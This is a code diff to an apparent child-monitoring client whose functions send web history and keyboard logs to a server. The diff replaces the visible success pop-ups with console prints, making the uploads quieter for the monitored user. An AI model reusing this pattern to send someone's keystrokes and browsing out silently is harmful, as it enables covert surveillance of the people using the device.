@@ -24,11 +24,13 @@ def apiAddDevice(accessToken):
             messagebox.showerror('Invalid', data.get("message"))
             return ''
         elif response.status_code == 200:
-            messagebox.showinfo('Success', data.get("message"))
+            # messagebox.showinfo('Success', data.get("message"))
             return ''
         return ''
 
 def apiSendWebHistory(accessToken):
+    if accessToken == "":
+        return ''
     url = HOST + "/v1/childs/web-history"
     # Set the headers to specify that you are sending JSON data
     headers = {'Content-Type': 'application/json','Authorization':'Bearer '+accessToken}
@@ -46,11 +48,14 @@ def apiSendWebHistory(accessToken):
         messagebox.showerror('Invalid', data.get("message"))
         return ''
     elif response.status_code == 200:
-        messagebox.showinfo('Success', data.get("message"))
+        print("Send Web history success!")
+        # messagebox.showinfo('Success', data.get("message"))
         return ''
     return ''
 
 def apiSendKeyboardLog(accessToken):
+    if accessToken == "":
+        return ''
     url = HOST + "/v1/childs/keyboard-log"
     # Set the headers to specify that you are sending JSON data
     headers = {'Content-Type': 'application/json','Authorization':'Bearer '+accessToken}
@@ -68,7 +73,8 @@ def apiSendKeyboardLog(accessToken):
         messagebox.showerror('Invalid', data.get("message"))
         return ''
     elif response.status_code == 200:
-        messagebox.showinfo('Success', data.get("message"))
+        print("Send Keyboard log success!")
+        # messagebox.showinfo('Success', data.get("message"))
         return ''
     return ''
 
